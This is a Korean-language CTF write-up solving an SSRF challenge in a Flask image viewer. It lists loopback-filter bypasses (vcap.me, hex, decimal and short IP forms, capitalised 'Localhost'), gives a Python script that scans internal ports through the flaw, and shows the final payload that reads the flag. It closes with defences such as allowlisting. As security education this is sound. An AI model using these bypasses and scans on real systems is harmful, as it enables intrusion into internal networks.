# 문제 설명 및 전체 코드

`flask`로 작성된 image viewer 서비스입니다.

`SSRF` 취약점을 이용해 플래그를 획득하세요.

플래그는 `/app/flag.txt`에 있습니다.

```
#!/usr/bin/python3
from flask import (
    Flask,
    request,
    render_template
)
import http.server
import threading
import requests
import os
import random
import base64
from urllib.parse import urlparse

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()  # Flag is here!!
except:
    FLAG = "[**FLAG**]"


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/img_viewer", methods=["GET", "POST"])
def img_viewer():
    if request.method == "GET":
        return render_template("img_viewer.html")
    elif request.method == "POST":
        url = request.form.get("url", "")
        urlp = urlparse(url)
        if url[0] == "/":
            url = "http://localhost:8000" + url
        elif ("localhost" in urlp.netloc) or ("127.0.0.1" in urlp.netloc):
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
            return render_template("img_viewer.html", img=img)
        try:
            data = requests.get(url, timeout=3).content
            img = base64.b64encode(data).decode("utf8")
        except:
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
        return render_template("img_viewer.html", img=img)


local_host = "127.0.0.1"
local_port = random.randint(1500, 1800)
local_server = http.server.HTTPServer(
    (local_host, local_port), http.server.SimpleHTTPRequestHandler
)
print(local_port)


def run_local_server():
    local_server.serve_forever()


threading._start_new_thread(run_local_server, ())

app.run(host="0.0.0.0", port=8000, threaded=True)
```

# 웹 서비스 분석

## 엔드포인트 : `/img_viewer`

```
@app.route("/img_viewer", methods=["GET", "POST"])
def img_viewer():
    if request.method == "GET":
        return render_template("img_viewer.html")
    elif request.method == "POST":
        url = request.form.get("url", "")
        urlp = urlparse(url)
        if url[0] == "/":
            url = "http://localhost:8000" + url
        elif ("localhost" in urlp.netloc) or ("127.0.0.1" in urlp.netloc):
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
            return render_template("img_viewer.html", img=img)
        try:
            data = requests.get(url, timeout=3).content
            img = base64.b64encode(data).decode("utf8")
        except:
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
        return render_template("img_viewer.html", img=img)
```

`GET` 메소드와 `POST` 메소드 요청을 처리하는 엔드페이지이다. 

먼저 `GET` 요청이 발생하면 아래와 같은 `img_viewer.html` 파일을 렌더링해준다. `form`을 통해 `url`을 입력하고, 해당 `url`에 위치하는 파일을 이미지로 보여주는 화면으로 보인다.

<img width="1038" alt="image" src="https://github.com/user-attachments/assets/b1f83cb2-1173-496c-96f5-eb2d0cd23d67">

그리고 `POST` 요청이 발생하면 위에서 보이는 `url` 필드에 입력된 값을 저장해주고, `urlparse` 함수를 통해 `url`을 파싱하여 `urlp`에 저장한다.

`urlparse` 함수는 URL의 스키마, 네트워크 위치, 경로, 파라미터, 쿼리, 프래그먼트 등을 포함하는 여러 속성을 나누어 변수에 저장한다.

예를 들어, `url`이 `http://example.com/path?query=1#fragment`라면, `urlp`는 다음과 같은 속성을 가질 것이다.

```
scheme: 'http'
netloc: 'example.com'
path: '/path'
params: ''
query: 'query=1'
fragment: 'fragment'
```

그럼 다시 돌아와서 아래를 보면, `url`의 첫 번째 문자값이 `/` 인 경우, `url = "http://localhost:8000" + url`를 통해 로컬호스트에 입력 받은 `url` 주소를 붙여서 전체 `url`을 업데이트 해준다.

그리고, 아래의 `try..except` 구문에서 `requests.get` 메서드를 통해 앞에서 업데이트해준 `url`에 `GET` 요청을 보내서, 요청의 응답으로 해당 URL 경로에 존재하는 파일을 `content`를 필드를 통해 가져온다.

해당 파일을 `base64`로 인코딩한 후 `utf8`로 디코딩하여, `img_viewer.html` 파일에 인자로 전달해준 후 렌더링한다. 만약 에러가 발생한다면 `error.png`를 같은 방식으로 인자로 전달한 후 렌더링해준다.

예를 들어, `placeholder` 에 입력되어 있던 값을 그대로 폼을 통해 전달하면 아래와 같이 이미지가 렌더링된다.

<img width="1064" alt="image" src="https://github.com/user-attachments/assets/37a5e280-6f0c-4c80-9d68-1f15815252e2">

여기서, `/app/flag.txt` 또는 `/flag.txt` 를 입력해줘도 아래와 같이 해당 파일이 존재하지 않아서 빈 이미지가 뜨는 이유에 대해 알아보자.

<img width="993" alt="image" src="https://github.com/user-attachments/assets/b96bc74a-2a54-41f0-b787-d15c91621fde">

`http://localhost:8000`은 웹 서버에서만 접근 가능한 로컬호스트이며, `8000`번 포트는 `flask`에서 사용하는 포트이다.

```
app.run(host="0.0.0.0", port=8000, threaded=True)
```

그런데 `flask`에서는 따로 설정해주지 않는다면, `flag.txt`와 같은 정적 파일을 제공해주는 **Serving static file**을 지원하지 않는다.

따라서, `/static/dream.png`나 `/error.png`는 `8000`번 포트의 로컬호스트에서 제공되도록 설정되었지만, `flag.txt`는 따로 설정되지 않았기 때문에 `GET` 요청을 보내도 해당 정적 파일을 가져올 수 없다.

이 부분은 다음에 조금 더 공부해본 후 보완해보면 좋을 것 같다.

***그럼 다시 돌아와서*** 만약, `url`이 `/`으로 시작하지 않고, `netloc`에 `localhost` 또는 `127.0.0.1`와 같은 로컬 호스트 주소가 존재한다면, `error.png` 파일을 위와 같은 방식으로 전달하여 페이지를 렌더링한다.

예를 들어 아래와 같이 `http://localhost:8000/app/flag.txt`를 입력하면, `error.png`가 전달되어 페이지가 렌더링될 것이다.

<img width="1019" alt="image" src="https://github.com/user-attachments/assets/37641c27-91a6-4331-b83e-eebed11825d3">

**만약 이렇게 필터링 없이 이용자에게 입력 받은 `url`을 통해 로컬호스트로 HTTP 요청을 보내는 것이 허용된다면, 웹 서비스의 권한으로 내부망(로컬 호스트)에 HTTP 요청을 보내고 응답을 받아올 수 있게 되므로 `SSRF` 취약점이 존재하게 된다.**

하지만 `netloc`에 `localhost`와 `127.0.0.1` 를 필터링 해주는 부분을 통해, 사용자가 웹 서버를 통해서만 접근할 수 있는 로컬호스트처럼 원하는 `url`로 `GET` 요청을 발생시켜서 임의의 파일을 읽어오게 하는 **SSRF** 취약점을 막게 된다.

하지만 여기에도 취약점이 존재하는데, 자세한 것은 아래의 `run_local_server` 함수를 파악한 후 **취약점 분석** 파트에서 다시 설명해보겠다.

### 참고 : URL 필터링

**URL 필터링**은 URL에 포함된 문자열을 검사하여 부적절한 URL로의 접근을 막는 보호 기법을 말한다. 

제어 방식에 따라 크게 **차단리스트(Denylist)** 필터링과 **허용리스트(Allowlist)** 필터링으로 나뉜다.

**차단리스트 필터**링은 URL에 포함되면 안되는 문자열로 차단리스트를 만들고, 이를 이용하여 이용자의 접근을 제어한다.

예를 들어, 차단리스트에 `“http://dreamhack.io”`가 있다면, `“http://dreamhack.io”`가 포함된 모든 URL로의 접근을 차단한다. 

차단리스트 필터링에는 생각하지 못하고 빠뜨린 예외가 항상 존재할 가능성이 있기 때문에, 이를 유의해야 한다.

**허용리스트 필터링**은 접근을 허용할 URL로 허용리스트를 만든다. 

이용자가 허용리스트 외의 URL에 접근하려하면 이를 차단한다.

## 기능 : `run_local_server`

```
local_host = "127.0.0.1"
local_port = random.randint(1500, 1800)
local_server = http.server.HTTPServer((local_host, local_port), http.server.SimpleHTTPRequestHandler) # 리소스를 반환하는 웹 서버
print(local_port)


def run_local_server():
    local_server.serve_forever()


threading._start_new_thread(run_local_server, ()) # 다른 쓰레드로 `local_server`를 실행합니다.
```

해당 부분을 잘 보면, 로컬 호스트를 설정하고 `1500~1800` 번 중 랜덤한 `port` 번호를 고른 후, 파이썬의 기본 모듈인 `http`를 이용하여 **HTTP 서버**를 실행한다.

`http.server.HTTPServer`의 두 번째 인자로 `http.server.SimpleHttpRequestHandler`를 전달하면, 

앞에서 얘기했었던, 현재 디렉터리를 기준으로 **URL**이 가리키는 경로에 존재하는 **정적 리소스를 반환하는(Serving static file) 웹 서버가 생성된다.**

**따라서 `/img_viewer` 엔드포인트를 통해서, `8000` 포트가 아니라 여기서 랜덤으로 설정된 포트를 통해 로컬호스트에 HTTP 요청을 보내도록 필터링을 우회한 후, `url`에 원하는 파일의 경로를 입력해주면 해당 파일을 가져올 수 있을 것이다.**

당연히 나와 같은 일반 이용자가 바로 브라우저 URL을 통해서 로컬호스트에 접근하려고 해도, 웹 서비스의 로컬호스트는 외부에서는 접근할 수 없기 때문에 **SSRF** 취약점을 통해 **내부 서버의 요청을 통해** 접근해야 하는 것을 기억하자.

# 취약점 분석

`run_local_server`에서 열려있는 정적 리소스를 반환하는 웹 서버는 로컬호스트이기 때문에, 웹 서버가 아닌 일반 이용자는 접근할 수 없다.

따라서, 웹 서버의 권한으로 해당 로컬호스트에 접근하여 `flag.txt` 파일을 가져오기 위해서는 **SSRF** 취약점을 통해 접근해야 한다.

**그러기 위해서는 웹 서버의 권한으로 HTTP 요청을 전달하는 있는 유일한 엔드포인트인 `/img_viewer` 를 통해, `url`에 `local_server`의 URL을 전달해서 웹 리소스를 리턴받은 후 `img_viewer.html` 파일에 인자로 전달하는값을 확인해야한다.**

그런데 `/img_viewer` 엔드포인트에서는 로컬호스트에 대해 필터링을 하기 때문에, 웹 서버의 포트 번호를 알아내더라도 해당 엔드포인트에서 `form`의 입력을 통해 로컬 호스트에 접근하는 것이 힘들어 보이기도 한다.

이를 우회할 수 있는 방법에 대해서 생각해보자.

## 1. `127.0.0.1`과 매핑된 도메인 이름 사용

도메인 이름을 구매한 후 이를 **DNS** 서버에 등록하여 원하는 IP 주소와 연결할 수 있다.

이후에는 등록한 이름이 IP 주소로 Resolve된다.

따라서 임의 도메인을 하나 구매하여 `127.0.0.1`와 연결한 후, 해당 도메인의 이름을 `url`에 전달하면 필터링을 우회할 수 있을 것이다.

`127.0.0.1`에는 이미 매핑된 `"*.vcap.me"`와 같은 도메인이 존재하기 때문에 해당 도메인을 이용해도 된다.

예를 들어 `http://vcap.me:8000/`와 같이 `url`을 전달하면, `http://127.0.0.1:8000/`에 접속하는 것과 같은 수행을 하게 된다.

## 2. `127.0.0.1`의 alias 이용

하나의 IP는 여러 방식으로 표기될 수 있다.

예를 들어, `127.0.0.1`은 각 자릿수를 **hex** 값으로 변환한 `0x7f.0x00.0x00.0x01` 또는 해당 값에서 `.`을 제거한 `0x7f000001` 도 가능하다.

또는 `hex` 값을 `decimal`로 풀어쓴 `2130706433`도 가능하며, 각 자리에서 `0`을 생략한 `127.1`, `127.0.1`도 가능하다.

그리고 `127.0.0.1`부터 `127.0.0.255` 까지의 IP는 **루프백(loop-back) 주소**라고 하여 모두 로컬 호스트를 가리킨다.

따라서 아래와 같이 여러 `url`을 전달해도 동일하게 `http://127.0.0.1:8000/`에 접속하는 것과 같은 수행을 하게 된다.

```
http://0x7f.0x00.0x00.0x01:8000/

http://0x7f000001:8000/

http://2130706433:8000/

http://127.0.1:8000/

http://127.0.0.255:8000/

http://127.255:8000/
```

## 3. `localhost`의 alias 이용

URL에서 호스트와 스키마(`http`)는 대소문자를 구분하지 않는다.

따라서 `localhost`가 아닌 `Localhost`를 전달해주어도 같은 호스트를 가리키기 때문에 필터링을 우회할 수 있다.

### Proof-of-Concept

위 내용들을 확인해보기 위해서는, `/img_viewer` 엔드포인트에서 위 URL을 전달해보면서 필터링에 걸리지 않는지 확인해보면 된다.

예를 들어서, `http://127.255:8000/static/dream.png`를 전달하면 아래와 같이 필터링을 잘 통과하여 `/static/dream.png` 파일을 가져오는 것을 확인할 수 있다.

<img width="1032" alt="image" src="https://github.com/user-attachments/assets/a764a687-5a50-4c99-adb7-1545c4045348">

또는, `http:/127.255:8000`을 전달해주면 `<img src>` 속성 값에 기본 템플릿이 `base.html` 파일의 내용이 base64 인코딩 + utf8 디코딩 되어 있는 것을 통해 확인해볼 수도 있다.

참고로, 이건 `8000`번 포트로 접속하는 것이므로 정적 리소스를 반환하는 `local_server`의 반환 방식과는 다르다. (`local_server`의 반환 방식은 아래에서 설명)

## 랜덤한 포트 찾기

정적 리소스를 반환해주는 `local_server`에서는 아래와 같은 코드를 통해 1500 ~ 1800 번 포트 중 랜덤한 포트로 로컬 서버를 열어주었다.

```
local_port = random.randint(1500, 1800)
```

`8000`번에서는 `flag.txt` 파일의 경로로 `GET` 요청을 보내도 해당 파일을 반환하도록 설정해주지 않았기 때문에, `local_server`를 통해 `flag.txt` 파일을 반환받아야 하기 때문에 해당 웹 서버의 포트 번호를 찾아야한다.

랜덤으로 설정해준 포트 번호는, 아래와 같이 파이썬의 `requests` 모듈을 활용한 스크립트를 통해 알아낼 수 있다.

```
import requests
import sys
from tqdm import tqdm

# `src` value of "NOT FOUND X"
NOTFOUND_IMG = "iVBORw0KG"


def send_img(img_url):
    global chall_url
    data = {
        "url": img_url,
    }
    response = requests.post(chall_url, data=data)
    return response.text


def find_port():
    for port in tqdm(range(1500, 1801)):
        img_url = f"http://Localhost:{port}"
        if NOTFOUND_IMG not in send_img(img_url):
            print(f"Internal port number is: {port}")
            break
    return port


if __name__ == "__main__":
    chall_port = int(sys.argv[1])
    chall_url = f"http://host3.dreamhack.games:{chall_port}/img_viewer"
    internal_port = find_port()
```

먼저, `NOTFOUND_IMG = "iVBORw0KG"` 를 통해 `"iVBORw0KG"` 라는 값을 저장해주는데, 이 값의 정체가 무엇인지 살펴보자.

만약 `/img_viewer` 엔드포인트에서 `url`을 통해 로컬호스트로 열려있지 않은 포트 번호를 전달하면, `try..except` 구문에서 exception이 발생하여 `error.png`이 렌더링된다.

`error.png` 파일을 base64로 인코딩한 후 utf8로 디코딩하면, 아래와 같이 `<img src>`의 속성 값으로 전달되는 `data` 값에 `"iVBORw0KG"`가 포함되게 된다.

<img width="684" alt="image" src="https://github.com/user-attachments/assets/0732bcd4-0153-43aa-8020-db7e13f519db">

따라서, 1500 ~ 1800번 중 열리지 않은 로컬호스트의 주소를 `/img_viewer` 엔드포인트에 `POST` 메소드로 전달하면, 응답값의 `text`에 `"iVBORw0KG"`가 포함되기 때문에 이를 통해 적절한 포트를 찾을 수 있다.

참고로, `local_server`에 `/` 엔드포인트를 전달하면, 해당 경로에 존재하는 파일들을 아래와 같은 `HTML` 형식으로 변환하여 전달해준다. (`<img src>`에 전달된 데이터를 base64 디코딩한 값이다.)

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <title>Directory listing for /</title>
</head>

<body>
  <h1>Directory listing for /</h1>
  <hr>
  <ul>
    <li><a href="app.py">app.py</a></li>
    <li><a href="error.png">error.png</a></li>
    <li><a href="flag.txt">flag.txt</a></li>
    <li><a href="requirements.txt">requirements.txt</a></li>
    <li><a href="static/">static/</a></li>
    <li><a href="templates/">templates/</a></li>
  </ul>
  <hr>
</body>

</html>
```

그럼 해당 스크립트의 전체 과정을 다시 설명하면 아래와 같다.

1. `main`에서 워게임 서버 호스트의 포트 번호를 커맨드라인을 통해 `chall_port`로 받아준 후, `chall_url`을 `/img_viewer` 엔드포인트로 설정 (해당 엔드포인트에 `POST` Request를 위해)

2. `find_port` 함수를 호출하여, 1500 ~ 1800 번 포트에 대해 반복문을 돌며, `/img_viewer`에 전달할 `url`을 `f"http://Localhost:{port}"`로 설정 (여기서 로컬호스트의 alias인 `Localhost`로 전달하여 필터링 우회)

3. `send_img` 함수에 해당 `url`을 인자로 전달하여, `NOTFOUND_IMG`가 `send_img`의 반환값에 존재하지 않는다면, 설정한 포트 번호를 찾은 것이므로 `print` 후 `break`
    
    - `send_img` 함수에서는 인자로 전달받은 `url`을 `data`로 설정하여, `/img_viewer` 엔드포인트에 `POST` 요청을 보낸 후 `response`에 `POST` 요청의 반환값을 저장

해당 과정을 수행하는 스크립트를 실행하면 아래와 같이 `1675` 포트 번호를 찾을 수 있다.

<img width="1007" alt="image" src="https://github.com/user-attachments/assets/550f686b-5e00-4ebd-b6d1-12649e860980">

# Exploit

그럼 이제 앞에서 찾은 포트 번호인 1675번과, `localhost`의 alias인 `Localhost`를 통해 `/img_viewer` 엔드포인트의 `url`에 아래의 값을 전달하면 된다.

```
http://Localhost:1675/flag.txt
```

참고로, 바로 현재 디렉토리에 `flag.txt`가 위치하는 것은, 위에서 `/` 엔드포인트의 파일 리스트에 `flag.txt`가 존재하는 것을 통해서 확인할 수도 있고,

문제 설명에서 플래그는 `/app/flag.txt`에 존재한다는 단서를 통해서 알아낼 수도 있다.

왜냐하면, 웹 서버를 실행하는 `app.py` 함수는 `/app` 디렉토리에서 실행되기 때문에 `app.py`의 정적 리소스 반환 서버인 `local_server`의 인덱스 경로인 `/`는 `/app`이 되기 때문이다.

따라서, 폼으로 전달해주면 `flag.txt` 파일의 내용이 base64 인코딩 -> utf8 디코딩 과정을 겪은 후 `<img src>`의 속성값에 전달되기 때문에,

이를 다시 base64 디코딩해주면 아래와 같이 플래그를 획득할 수 있다.

참고로, utf8 디코딩은 base64를 통해서 인코딩한 값을 유니코드로 디코딩하는 것이기 때문에 상관하지 않고 바로 base64로 디코딩해주면 원래의 값을 알아낼 수 있다.

<img width="426" alt="image" src="https://github.com/user-attachments/assets/23ccb229-f8f5-438c-877f-7a921a839a07">

<img width="634" alt="image" src="https://github.com/user-attachments/assets/5d051e36-1250-471e-ad41-3bccf6eb1d4a">

참고로, 루프백 주소에서 `0`을 생략한 `http://127.255:1675/flag.txt`는 `error.png`가 랜더링되었는데 그 이유를 잘 모르겠다.

`8000`번 포트에서는 해당 alias를 통해서도 접근이 정상적으로 가능했는데, `local_server`에서는 안되는 이유를 한번 찾아봐야겠다.

# 마치며

이번 문제에서는 **SSRF 공격**을 통해 플래그를 회득할 수 있었다.

문제에서는 URL 필터링으로 SSRF를 방어하려 했지만, 필터링에서 여러 요소들을 고려하지 못하여 이를 쉽게 우회할 수 있었다. 

해결 방법으로는 **Allow List**를 통해 더욱 강한 URL 필터링을 적용하거나, 

HTTP 요청을 하는 애플리케이션(`/image viewer`)을 내부망과 분리하여, 웹 서버의 권한으로 HTTP 요청을 할 수 없도록 하여 내부망의 보안을 강화하는 방법이 있다.
